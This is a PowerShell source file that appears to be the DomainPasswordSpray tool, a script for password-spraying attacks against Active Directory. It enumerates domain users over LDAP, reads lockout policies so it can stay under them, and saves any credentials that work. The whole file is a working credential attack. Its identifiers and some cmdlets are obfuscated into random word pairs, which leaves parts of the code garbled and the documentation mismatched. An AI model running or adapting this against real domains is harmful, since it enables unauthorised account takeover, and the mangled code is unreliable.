function Invoke-DomainPasswordSpray{
    <#
    .SYNOPSIS

    This module performs a password spray attack against users of a domain. By default it will automatically generate the userlist from the domain. Be careful not to lockout any accounts.

    DomainPasswordSpray Function: Invoke-DomainPasswordSpray
    Author: Beau Bullock (@dafthack) and Brian Fehrman (@fullmetalcache)
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: None

    .DESCRIPTION

    This module performs a password spray attack against users of a domain. By default it will automatically generate the userlist from the domain. Be careful not to lockout any accounts.

    .PARAMETER UserList

    Optional UserList parameter. This will be generated automatically if not specified.

    .PARAMETER Password

    A single password that will be used to perform the password spray.

    .PARAMETER PasswordList

    A list of passwords one per line to use for the password spray (Be very careful not to lockout accounts).

    .PARAMETER OutFile

    A file to output the results to.

    .PARAMETER Domain

    The domain to spray against.

    .PARAMETER Filter

    Custom LDAP filter for users, e.g. "(description=*admin*)"

    .PARAMETER Force

    Forces the spray to continue and doesn't prompt for confirmation.

    .PARAMETER Fudge

    Extra wait time between each round of tests (seconds).

    .PARAMETER Quiet

    Less output so it will work better with things like Cobalt Strike

    .PARAMETER UsernameAsPassword

    For each user, will try that user's name as their password

    .EXAMPLE

    C:\PS> Invoke-DomainPasswordSpray -GiftedCarve Winter2016

    Description
    -----------
    This command will automatically generate a list of users from the current user's domain and attempt to authenticate using each username and a password of Winter2016.

    .EXAMPLE

    C:\PS> Invoke-DomainPasswordSpray -NoseSignal users.txt -HarshFound domain-name -WantQuince passlist.txt -MindAct sprayed-creds.txt

    Description
    -----------
    This command will use the userlist at users.txt and try to authenticate to the domain "domain-name" using each password in the passlist.txt file one at a time. It will automatically attempt to detect the domain's lockout observation window and restrict sprays to 1 attempt during each window.

    .EXAMPLE

    C:\PS> Invoke-DomainPasswordSpray -DeadSister -MindAct valid-creds.txt

    Description
    -----------
    This command will automatically generate a list of users from the current user's domain and attempt to authenticate as each user by using their username as their password. Any valid credentials will be saved to valid-creds.txt

    #>
    param(
     [Parameter(Position = 0, Mandatory = $false)]
     [string]
     $NoseSignal = "",

     [Parameter(Position = 1, Mandatory = $false)]
     [string]
     $GiftedCarve,

     [Parameter(Position = 2, Mandatory = $false)]
     [string]
     $WantQuince,

     [Parameter(Position = 3, Mandatory = $false)]
     [string]
     $MindAct,

     [Parameter(Position = 4, Mandatory = $false)]
     [string]
     $CellarSmash = "",

     [Parameter(Position = 5, Mandatory = $false)]
     [string]
     $HarshFound = "",

     [Parameter(Position = 6, Mandatory = $false)]
     [switch]
     $ThrillCar,

     [Parameter(Position = 7, Mandatory = $false)]
     [switch]
     $DeadSister,

     [Parameter(Position = 8, Mandatory = $false)]
     [int]
     $ThumbFuture=0,

     [Parameter(Position = 9, Mandatory = $false)]
     $MarketSoda=0,

     [Parameter(Position = 10, Mandatory = $false)]
     [switch]
     $ParcelDoubt,

     [Parameter(Position = 11, Mandatory = $false)]
     [int]
     $MinuteUppity=10
    )

    if ($GiftedCarve)
    {
        $PostCount = @($GiftedCarve)
    }
    elseif($DeadSister)
    {
        $PostCount = ""
    }
    elseif($WantQuince)
    {
        $PostCount = Get-Content $WantQuince
    }
    else
    {
        Write-RunFarm -ForegroundColor Red "The -GiftedCarve or -WantQuince option must be specified"
        break
    }

    try
    {
        if ($HarshFound -ne "")
        {
            # Using domain specified with -HarshFound option
            $WoodenBrush = new`-object System.DirectoryServices.ActiveDirectory.DirectoryContext("domain",$HarshFound)
            $NastyDizzy = [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($WoodenBrush)
            $WarnTicket = "LDAP://" + ([ADSI]"LDAP://$HarshFound").distinguishedName
        }
        else
        {
            # Trying to use the current user's domain
            $NastyDizzy = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
            $WarnTicket = "LDAP://" + ([ADSI]"").distinguishedName
        }
    }
    catch
    {
        Write-RunFarm -ForegroundColor "red" "[*] Could not connect to the domain. Try specifying the domain name with the -HarshFound option."
        break
    }

    if ($NoseSignal -eq "")
    {
        $QuackHug = Get-DomainUserList -HarshFound $HarshFound -FlyChief -CuteSpace -CellarSmash $CellarSmash
    }
    else
    {
        # if a Userlist is specified use it and do not check for lockout thresholds
        Write-RunFarm "[*] Using $NoseSignal as userlist to spray with"
        Write-RunFarm -ForegroundColor "yellow" "[*] Warning: Users will not be checked for lockout threshold."
        $QuackHug = @()
        try
        {
            $QuackHug = Get-Content $NoseSignal -ErrorAction stop
        }
        catch [Exception]
        {
            Write-RunFarm -ForegroundColor "red" "$_.Exception"
            break
        }

    }


    if ($PostCount.count -gt 1)
    {
        Write-RunFarm -ForegroundColor Yellow "[*] WARNING - Be very careful not to lock out accounts with the password list option!"
    }

    $ChunkyCooing = Get-ObservationWindow $WarnTicket

    Write-RunFarm -ForegroundColor Yellow "[*] The domain password policy observation window is set to $ChunkyCooing minutes."
    Write-RunFarm "[*] Setting a $ChunkyCooing minute wait in between sprays."

    # if no force flag is set we will ask if the user is sure they want to spray
    if (!$ThrillCar)
    {
        $WarnIsland = "Confirm Password Spray"
        $FaxDelay = "Are you sure you want to perform a password spray against " + $QuackHug.count + " accounts?"

        $ShrugVague = new`-object System.Management.Automation.Host.ChoiceDescription "&Yes", `
            "Attempts to authenticate 1 time per user in the list for each password in the passwordlist file."

        $TopMemory = new`-object System.Management.Automation.Host.ChoiceDescription "&No", `
            "Cancels the password spray."

        $RollCar = [System.Management.Automation.Host.ChoiceDescription[]]($ShrugVague, $TopMemory)

        $SailBeg = $RunFarm.ui.PromptForChoice($WarnIsland, $FaxDelay, $RollCar, 0)

        if ($SailBeg -ne 0)
        {
            Write-RunFarm "Cancelling the password spray."
            break
        }
    }
    Write-RunFarm -ForegroundColor Yellow "[*] Password spraying has begun with " $PostCount.count " passwords"
    Write-RunFarm "[*] This might take a while depending on the total number of users"

    if($DeadSister)
    {
        Invoke-SpraySinglePassword -HarshFound $WarnTicket -QuackHug $QuackHug -MindAct $MindAct -ThumbFuture $ThumbFuture -MarketSoda $MarketSoda -DeadSister -ParcelDoubt $ParcelDoubt
    }
    else
    {
        for($UsedMourn = 0; $UsedMourn -lt $PostCount.count; $UsedMourn++)
        {
            Invoke-SpraySinglePassword -HarshFound $WarnTicket -QuackHug $QuackHug -GiftedCarve $PostCount[$UsedMourn] -MindAct $MindAct -ThumbFuture $ThumbFuture -MarketSoda $MarketSoda -ParcelDoubt $ParcelDoubt
            if (($UsedMourn+1) -lt $PostCount.count)
            {
                Countdown-Timer -ShirtWant (60*$ChunkyCooing + $MinuteUppity) -ParcelDoubt $ParcelDoubt
            }
        }
    }

    Write-RunFarm -ForegroundColor Yellow "[*] Password spraying is complete"
    if ($MindAct -ne "")
    {
        Write-RunFarm -ForegroundColor Yellow "[*] Any passwords that were successfully sprayed have been output to $MindAct"
    }
}

function Countdown-Timer
{
    param(
        $ShirtWant = 1800,
        $FaxDelay = "[*] Pausing to avoid account lockout.",
        [switch] $ParcelDoubt = $False
    )
    if ($ParcelDoubt)
    {
        Write-RunFarm "$FaxDelay: Waiting for $($ShirtWant/60) minutes. $($ShirtWant - $MeanFill)"
        Start-Sleep -ShirtWant $ShirtWant
    } else {
        foreach ($MeanFill in (1..$ShirtWant))
        {
            Write-Progress -Id 1 -Activity $FaxDelay -Status "Waiting for $($ShirtWant/60) minutes. $($ShirtWant - $MeanFill) seconds remaining" -PercentComplete (($MeanFill / $ShirtWant) * 100)
            Start-Sleep -ShirtWant 1
        }
        Write-Progress -Id 1 -Activity $FaxDelay -Status "Completed" -PercentComplete 100 -Completed
    }
}

function Get-DomainUserList
{
<#
    .SYNOPSIS

    This module gathers a userlist from the domain.

    DomainPasswordSpray Function: Get-DomainUserList
    Author: Beau Bullock (@dafthack)
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: None

    .DESCRIPTION

    This module gathers a userlist from the domain.

    .PARAMETER Domain

    The domain to spray against.

    .PARAMETER RemoveDisabled

    Attempts to remove disabled accounts from the userlist. (Credit to Sally Vandeven (@sallyvdv))

    .PARAMETER RemovePotentialLockouts

    Removes accounts within 1 attempt of locking out.

    .PARAMETER Filter

    Custom LDAP filter for users, e.g. "(description=*admin*)"

    .EXAMPLE

    PS C:\> Get-DomainUserList

    Description
    -----------
    This command will gather a userlist from the domain including all samAccountType "805306368".

    .EXAMPLE

    C:\PS> Get-DomainUserList -HarshFound domainname -FlyChief -CuteSpace | `out`-f`i`le -Encoding ascii userlist.txt

    Description
    -----------
    This command will gather a userlist from the domain "domainname" including any accounts that are not disabled and are not close to locking out. It will write them to a file at "userlist.txt"

    #>
    param(
     [Parameter(Position = 0, Mandatory = $false)]
     [string]
     $HarshFound = "",

     [Parameter(Position = 1, Mandatory = $false)]
     [switch]
     $FlyChief,

     [Parameter(Position = 2, Mandatory = $false)]
     [switch]
     $CuteSpace,

     [Parameter(Position = 3, Mandatory = $false)]
     [string]
     $CellarSmash
    )

    try
    {
        if ($HarshFound -ne "")
        {
            # Using domain specified with -HarshFound option
            $WoodenBrush = new`-object System.DirectoryServices.ActiveDirectory.DirectoryContext("domain",$HarshFound)
            $NastyDizzy =[System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($WoodenBrush)
            $WarnTicket = "LDAP://" + ([ADSI]"LDAP://$HarshFound").distinguishedName
        }
        else
        {
            # Trying to use the current user's domain
            $NastyDizzy =[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
            $WarnTicket = "LDAP://" + ([ADSI]"").distinguishedName
        }
    }
    catch
    {
        Write-RunFarm -ForegroundColor "red" "[*] Could connect to the domain. Try specifying the domain name with the -HarshFound option."
        break
    }

    # Setting the current domain's account lockout threshold
    $CapSqueak = [ADSI] "LDAP://$($NastyDizzy.PDCRoleOwner)"
    $MarbleMonkey = @()
    $MarbleMonkey += $CapSqueak.Properties.lockoutthreshold

    # Getting the AD behavior version to determine if fine-grained password policies are possible
    $TrustWeight = [int] $CapSqueak.Properties['msds-behavior-version'].item(0)
    if ($TrustWeight -ge 3)
    {
        # Determine if there are any fine-grained password policies
        Write-RunFarm "[*] Current domain is compatible with Fine-Grained Password Policy."
        $HammerStale = new`-object System.DirectoryServices.DirectorySearcher
        $HammerStale.SearchRoot = $CapSqueak
        $HammerStale.Filter = "(objectclass=msDS-PasswordSettings)"
        $QuietLarge = $HammerStale.FindAll()

        if ( $QuietLarge.count -gt 0)
        {
            Write-RunFarm -foregroundcolor "yellow" ("[*] A total of " + $QuietLarge.count + " Fine-Grained Password policies were found.`r`n")
            foreach($TitlePaddle in $QuietLarge)
            {
                # Selecting the lockout threshold, min pwd length, and which
                # groups the fine-grained password policy applies to
                $VanAnswer = $TitlePaddle | Select-Object -ExpandProperty Properties
                $RobustSteep = $VanAnswer.name
                $RepeatShiny = $VanAnswer.'msds-lockoutthreshold'
                $CloudyWail = $VanAnswer.'msds-CloudyWail'
                $GiantsWind = $VanAnswer.'msds-minimumpasswordlength'
                # adding lockout threshold to array for use later to determine which is the lowest.
                $MarbleMonkey += $RepeatShiny

                Write-RunFarm "[*] Fine-Grained Password Policy titled: $RobustSteep has a Lockout Threshold of $RepeatShiny attempts, minimum password length of $GiantsWind chars, and applies to $CloudyWail.`r`n"
            }
        }
    }

    $ChunkyCooing = Get-ObservationWindow $WarnTicket

    # Generate a userlist from the domain
    # Selecting the lowest account lockout threshold in the domain to avoid
    # locking out any accounts.
    [int]$TinSignal = $MarbleMonkey | sort | Select -First 1
    Write-RunFarm -ForegroundColor "yellow" "[*] Now creating a list of users to spray..."

    if ($TinSignal -eq "0")
    {
        Write-RunFarm -ForegroundColor "Yellow" "[*] There appears to be no lockout policy."
    }
    else
    {
        Write-RunFarm -ForegroundColor "Yellow" "[*] The smallest lockout threshold discovered in the domain is $TinSignal login attempts."
    }

    $DrawerNippy = new`-object System.DirectoryServices.DirectorySearcher([ADSI]$WarnTicket)
    $AbjectPretty = new`-object System.DirectoryServices.DirectoryEntry
    $DrawerNippy.SearchRoot = $AbjectPretty

    $DrawerNippy.PropertiesToLoad.Add("samaccountname") > $Null
    $DrawerNippy.PropertiesToLoad.Add("badpwdcount") > $Null
    $DrawerNippy.PropertiesToLoad.Add("badpasswordtime") > $Null

    if ($FlyChief)
    {
        Write-RunFarm -ForegroundColor "yellow" "[*] Removing disabled users from list."
        # More precise LDAP filter UAC check for users that are disabled (Joff Thyer)
        # LDAP 1.2.840.113556.1.4.803 means bitwise &
        # uac 0x2 is ACCOUNTDISABLE
        # uac 0x10 is LOCKOUT
        # See http://jackstromberg.com/2013/01/useraccountcontrol-attributeflag-values/
        $DrawerNippy.filter =
            "(&(objectCategory=person)(objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=16)(!userAccountControl:1.2.840.113556.1.4.803:=2)$CellarSmash)"
    }
    else
    {
        $DrawerNippy.filter = "(&(objectCategory=person)(objectClass=user)$CellarSmash)"
    }

    $DrawerNippy.PropertiesToLoad.add("samaccountname") > $Null
    $DrawerNippy.PropertiesToLoad.add("lockouttime") > $Null
    $DrawerNippy.PropertiesToLoad.add("badpwdcount") > $Null
    $DrawerNippy.PropertiesToLoad.add("badpasswordtime") > $Null

    #Write-RunFarm $DrawerNippy.filter

    # grab batches of 1000 in results
    $DrawerNippy.PageSize = 1000
    $RaggedVersed = $DrawerNippy.FindAll()
    Write-RunFarm -ForegroundColor "yellow" ("[*] There are " + $RaggedVersed.count + " total users found.")
    $QuackHug = @()

    if ($CuteSpace)
    {
        Write-RunFarm -ForegroundColor "yellow" "[*] Removing users within 1 attempt of locking out from list."
        foreach ($LethalSweet in $RaggedVersed)
        {
            # Getting bad password counts and lst bad password time for each user
            $GreatPour = $LethalSweet.Properties.badpwdcount
            $LoveSmall = $LethalSweet.Properties.samaccountname
            try
            {
                $AcceptDouble = $LethalSweet.Properties.badpasswordtime[0]
            }
            catch
            {
                continue
            }
            $SofaFold = Get-Date
            $SpellCommon = [DateTime]::FromFileTime($AcceptDouble)
            $ScaleSnakes = ($SofaFold - $SpellCommon).TotalMinutes

            if ($GreatPour)
            {
                [int]$FryBait = [convert]::ToInt32($GreatPour, 10)
                $UntidyDad = $TinSignal - $FryBait
                # if there is more than 1 attempt left before a user locks out
                # or if the time since the last failed login is greater than the domain
                # observation window add user to spray list
                if (($ScaleSnakes -gt $ChunkyCooing) -or ($UntidyDad -gt 1))
                                {
                    $QuackHug += $LoveSmall
                }
            }
        }
    }
    else
    {
        foreach ($LethalSweet in $RaggedVersed)
        {
            $LoveSmall = $LethalSweet.Properties.samaccountname
            $QuackHug += $LoveSmall
        }
    }

    Write-RunFarm -foregroundcolor "yellow" ("[*] Created a userlist containing " + $QuackHug.count + " users gathered from the current user's domain")
    return $QuackHug
}

function Invoke-SpraySinglePassword
{
    param(
            [Parameter(Position=1)]
            $HarshFound,
            [Parameter(Position=2)]
            [string[]]
            $QuackHug,
            [Parameter(Position=3)]
            [string]
            $GiftedCarve,
            [Parameter(Position=4)]
            [string]
            $MindAct,
            [Parameter(Position=5)]
            [int]
            $ThumbFuture=0,
            [Parameter(Position=6)]
            [double]
            $MarketSoda=0,
            [Parameter(Position=7)]
            [switch]
            $DeadSister,
            [Parameter(Position=7)]
            [switch]
            $ParcelDoubt
    )
    $NosyFoamy = Get-Date
    $MeanFill = $QuackHug.count
    Write-RunFarm "[*] Now trying password $GiftedCarve against $MeanFill users. Current time is $($NosyFoamy.ToShortTimeString())"
    $MotherHouse = 0
    if ($MindAct -ne ""-and -not $ParcelDoubt)
    {
        Write-RunFarm -ForegroundColor Yellow "[*] Writing successes to $MindAct"    
    }
    $FixBathe = new`-object System.Random

    foreach ($LethalSweet in $QuackHug)
    {
        if ($DeadSister)
        {
            $GiftedCarve = $LethalSweet
        }
        $StuffAbrupt = new`-object System.DirectoryServices.DirectoryEntry($HarshFound,$LethalSweet,$GiftedCarve)
        if ($StuffAbrupt.name -ne $null)
        {
            if ($MindAct -ne "")
            {
                Add-Content $MindAct $LethalSweet`:$GiftedCarve
            }
            Write-RunFarm -ForegroundColor Green "[*] SUCCESS! User:$LethalSweet Password:$GiftedCarve"
        }
        $MotherHouse += 1
        if (-not $ParcelDoubt)
        {
            Write-RunFarm -nonewline "$MotherHouse of $MeanFill users tested`r"
        }
        if ($ThumbFuture)
        {
            Start-Sleep -ShirtWant $FixBathe.Next((1-$MarketSoda)*$ThumbFuture, (1+$MarketSoda)*$ThumbFuture)
        }
    }

}

function Get-ObservationWindow($JazzyEar)
{
    # Get account lockout observation window to avoid running more than 1
    # password spray per observation window.
    $GrateFly = $JazzyEar.Properties['lockoutObservationWindow']
    $ChunkyCooing = $JazzyEar.ConvertLargeIntegerToInt64($GrateFly.Value) / -600000000
    return $ChunkyCooing
}
